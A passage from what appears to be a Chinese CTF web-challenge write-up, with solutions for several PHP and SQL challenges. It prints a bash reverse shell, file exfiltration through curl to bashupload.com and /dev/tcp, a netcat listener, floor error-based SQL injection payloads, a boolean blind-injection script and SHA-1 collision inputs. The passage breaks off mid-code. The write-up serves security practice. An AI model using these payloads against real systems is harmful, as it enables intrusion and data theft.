punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">c1</span><span class="token operator">=</span><span class="token variable">$qq</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">bb</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">fun</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token double-quoted-string string">"34"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>        <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$aadd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">aa</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">bb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token double-quoted-string string">"fun"</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre><p>输出</p><pre><code>34array(1) &#123;[0]=&gt;string(3) &quot;123&quot;&#125;</code></pre><p>所以在一个数组中，<code>[new a(),&quot;fff&quot;]()</code>就相当于<code>new a()-&gt;ff()</code>,当然，后面的<code>()</code>里也可以加参数，如果需要的话</p><p><code>php是世界上最好的语言✔（￣︶￣）↗　</code></p><h2 id="where-is-my-FUMO"><a href="#where-is-my-FUMO" class="headerlink" title="where_is_my_FUMO"></a>where_is_my_FUMO</h2><pre class="language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$black_list</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token double-quoted-string string">">"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">";"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"|"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#123;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"&#125;"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"/"</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">" "</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token variable">$black_list</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'DATA'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token function">chijou_kega_no_junnka</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'PORT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"bash -c \"bash -i &lt; /dev/tcp/<span class="token interpolation"><span class="token variable">$addr</span></span>/<span class="token interpolation"><span class="token variable">$port</span></span>\""</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span></code></pre><p>反弹shell，但是是个无回显的shell,可以无回显shell中执行反弹shell命令，再次反弹到VPS的另一个端口</p><p><code>bash -i &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></p><p>flag在<code>/flag.png</code>中</p><p>可以这样<code>curl bashupload.com -T /flag.png</code> </p><p><code>bashupload.com</code>是一个用来传输服务器文件的网站</p><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301202589.png"><br><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111301203952.png"></p><p>下载即可</p><ul><li>第二种方法<br>传到自己的服务器上<br><code>cat /flag.png &gt;&amp; /dev/tcp/IP/2233 0&gt;&amp;1</code></li></ul><p><code>nc -lvnp 2233 &gt; /var/flag.png</code></p><h2 id="Baby-PHP-Black-Magic-Enlightenment"><a href="#Baby-PHP-Black-Magic-Enlightenment" class="headerlink" title="Baby_PHP_Black_Magic_Enlightenment"></a>Baby_PHP_Black_Magic_Enlightenment</h2><p>第一关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token double-quoted-string string">"PHP is the best Language &lt;br/>"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token double-quoted-string string">"Have you ever heard about PHP Black Magic&lt;br/>"</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no way"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token constant">NULL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token operator">></span><span class="token number">9999</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'./2.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"How's that possible"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//Art is long, but life is short. So I use PHP.</span><span class="token comment">//I think It`s So useful that DiaoRen Said;</span><span class="token comment">//why not they use their vps !!!</span><span class="token comment">//BBTZ le jiarenmen</span><span class="token delimiter important">?></span></code></pre><p><code>/?password=10000a</code></p><p>第二关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'G1ve u the flag'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'not right'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just g1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p><code>/baby_magic.php?user[]=1&amp;pass[]=2</code><br>第三关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'fllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'no no no no way for you to do so.'</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'There is no way you can sneak me, young man!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">echo</span> <span class="token double-quoted-string string">"Hanzo:It is impossible only the tribe of Shimada can controle the dragon&lt;br/>"</span><span class="token punctuation">;</span>      <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'Genji:We will see again Hanzo'</span><span class="token punctuation">.</span><span class="token variable">$flag</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'&lt;br/>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">else</span>        <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Wrong!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span>    <span class="token keyword">echo</span> <span class="token single-quoted-string string">'Just G1ve it a try.'</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> </code></pre><p>sha1哈希碰撞</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestrotimi <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-1.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span>letmein <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">"http://shattered.io/static/shattered-2.pdf"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">500</span><span class="token punctuation">]</span><span class="token punctuation">;</span> r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'http://tc.rigelx.top:8003/baby_revenge.php'</span><span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'user'</span><span class="token punctuation">:</span> rotimi<span class="token punctuation">,</span> <span class="token string">'pass'</span><span class="token punctuation">:</span> letmein<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#来自：https://www.linkedin.com/pulse/using-sha1-collision-attack-solve-bostonkeyparty-ctf-rotimi</span></code></pre><p>或者：<br>    ?user=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1</p><pre><code>&amp;pass=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1</code></pre><p>第四关：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$flag</span><span class="token operator">=</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'flllllllllag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">,</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"no no no!&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'id'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token double-quoted-string string">"Longlone"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token double-quoted-string string">"flag: <span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>url编码脚本</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$string</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'Longlone'</span><span class="token punctuation">;</span> <span class="token comment">//需要二次编码的字符或字符串</span><span class="token variable">$result</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$string</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$char</span> <span class="token operator">=</span> <span class="token variable">$string</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii1</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$ascii2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$ascii2</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii1</span><span class="token punctuation">.</span><span class="token single-quoted-string string">'%'</span><span class="token punctuation">.</span><span class="token variable">$ascii2</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token variable">$char</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token variable">$char</span><span class="token punctuation">.</span><span class="token single-quoted-string string">': '</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token double-quoted-string string">"\n"</span><span class="token punctuation">;</span>                <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token punctuation">.</span><span class="token variable">$aaa</span><span class="token punctuation">;</span>                <span class="token keyword">break</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>payload:<code>?id=%4%43%6%46%6%45%6%37%6%43%6%46%6%45%6%35</code></p><h2 id="anothersql"><a href="#anothersql" class="headerlink" title="anothersql"></a>anothersql</h2><p><img src="https://gitee.com/ll_nn/pic/raw/master/img/202111302157152.png"><br><code>floor报错注入</code><br>payload:<br>注库：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(schema_name) from information_schema.schemata),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#a,fffaaakkkeeeflag,mysql,performance_schema,sys,true____flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注表：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(table_name) from information_schema.tables where table_schema=&#39;true____flag&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#syclover&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>注列：<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(column_name) from information_schema.columns where table_name=&#39;syclover&#39;),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#id,uname,pwd,flag&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p>flag:<code>-1&#39; union select 1,2,3,4 from (select count(*),concat(floor(rand(0)*2),(select concat(&#39;#&#39;,right((SELECT group_concat(flag) from true____flag.syclover),60))))a from information_schema.tables group by a)b#</code></p><pre><code>&lt;script&gt;alert(&quot;Duplicate entry &#39;1#SYC&#123;U_4N0vv_3rR0r_Inj3c410n&#125;&#39; for key &#39;&lt;group_key&gt;&#39;&quot;);parent.location.href=&quot;index.php&quot;;&lt;/script&gt;</code></pre><p><code>right函数</code></p><pre><code>mysql&gt; SELECT RIGHT(&#39;MySQL&#39;,3);+------------------+| RIGHT(&#39;MySQL&#39;,3) |+------------------+| SQL              |+------------------+1 row in set (0.00 sec)</code></pre><p><code>left函数</code></p><pre><code>mysql&gt; SELECT LEFT(&#39;MySQL LEFT&#39;, 5);+-----------------------+| LEFT(&#39;MySQL LEFT&#39;, 5) |+-----------------------+| MySQL                 |+-----------------------+1 row in set</code></pre><p><code>mid函数</code>—–和substr差不多</p><pre><code>mysql&gt; select mid(&#39;adbdab&#39;,3,2);+-------------------+| mid(&#39;adbdab&#39;,3,2) |+-------------------+| bd                |+-------------------+1 row in set (0.01 sec)</code></pre><p>substr被过了就用上面三个代替</p><h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><p>bool盲注</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> stringurl<span class="token operator">=</span><span class="token string">'http://47.100.242.70:4725/check.php'</span>strr<span class="token operator">=</span>string<span class="token punctuation">.</span>printableres<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> s <span class="token keyword">in</span> strr<span class="token punctuation">:</span>        <span class="token comment">#payload="admi'or(mid(database(),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema='easysql')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        <span class="token comment">#payload="admi'or(mid((select(group_concat(column_name))from(information_schema.columns)where(table_name='syclover')),&#123;&#125;,1)='&#123;&#125;')='1".format(i,s)</span>        payload<span class="token operator">=</span><span class="token string">"admi'or(mid((select(group_concat(pwd))from(easysql.syclover)),&#123;&#125;,1)='&#123;&#125;')='1"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span>        <span class="token comment">#print(payload)</span>        data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"uname"</span><span class="token punctuation">:</span>payload<span class="token punctuation">,</span><span class="token string">"pwd"</span><span class="token punctuation">:</span><span class="token string">"adm"</span><span class="token punctuation">,</span><span class="token string">"wp-submit"</span><span class="token punctuation">:</span><span class="token string">"%E7%99%BB%E5%BD%95"</span><span class="token punctuation">&#125;</span>        r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token string">'wrong password'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>            res<span class="token operator">+=</span>s            <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>            <span class="token keyword">break</span></code></pre><p>空格过了用<code>()</code>,<code>substr</code>被过用<code>mid</code></p><h2 id="SoEzUnser"><a href="#SoEzUnser" class="headerlink" title="SoEzUnser"></a>SoEzUnser</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">fxxk</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$par3</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$kelasi</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$par0</span><span class="token punctuation">,</span><span class="token variable">$par1</span><span class="token punctuation">,</span><span class="token variable">$par2</span><span class="token punctuation">,</span><span class="token variable">$par3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par0 <span class="token operator">=</span> <span class="token variable">$par0</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par1 <span class="token operator">=</span> <span class="token variable">$par1</span><span class="token punctuation">;</span>        <span class="token variable">$this</span> <span class="token operator">-</span><span class="token operator">></span> par2 <span class="token operator">=</span> <span class="token variable">$par2</span><span class="token punctuation">;</span>        <span 